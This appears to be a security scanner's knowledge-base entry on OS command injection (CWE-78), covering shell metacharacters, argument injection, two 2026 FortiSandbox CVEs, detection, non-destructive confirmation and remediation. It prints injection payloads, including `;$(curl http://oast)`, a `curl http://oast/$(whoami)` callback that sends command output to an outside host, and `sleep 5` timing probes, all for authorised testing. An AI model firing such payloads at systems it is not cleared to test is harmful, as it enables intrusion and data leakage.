# OS Command Injection (CWE-78)

**Class:** server-side  **Updated:** 2026-10-25

## What it is
Server-side execution of system commands via shell metacharacters (`;`, `|`,
`&`, `$()`, backticks, newlines) or argument injection
(`--configPath=/tmp/evil`, `-T4`). The recurring 2026 KEV appliance stereotype:
FortiSandbox CVE-2026-25089 and CVE-2026-39808 — both *unauthenticated* OS
command injection via crafted HTTP requests, CVSS 9.8, KEV July 2026. RCE share
of high-impact CVEs in July 2026: 57/85 (Recorded Future).

## How Mythos detects it
- Engine: OOB-first (most reliable, no response diffs needed):
  `;$(curl http://oast)` variants in parameter fuzzing, split into echo-based
  and blind.
- Response oracles: time delay (`sleep 5`), arithmetic echo
  (`$(expr 1 + 1)` → `2`), stderr leak into response.
- Tools: commix (toolbox), nuclei `rce` templates.
- Domain-specific: test *argument injection* separately (extra `-` flags,
  not shell chains) — a scanner blind spot and a classic against document/
  image/PDF utilities (wkhtml2pdf, ImageMagick, pandoc).

## How to confirm (non-destructive)
OOB callback as proof (`curl http://oast/$(whoami)`), or `id` output echoed in
the response. Never `cat /etc/shadow`, no recon collection on real targets.

## Remediation
Library instead of shell API (`subprocess` list without `shell=True`),
allowlist input validation, correct `escapeshellarg` usage, RPC over CLI.

## Sources
- CISA KEV, CVE-2026-25089/39808 (2026-07); OWASP WSTG-INPV-12; Recorded Future Insikt 2026-07
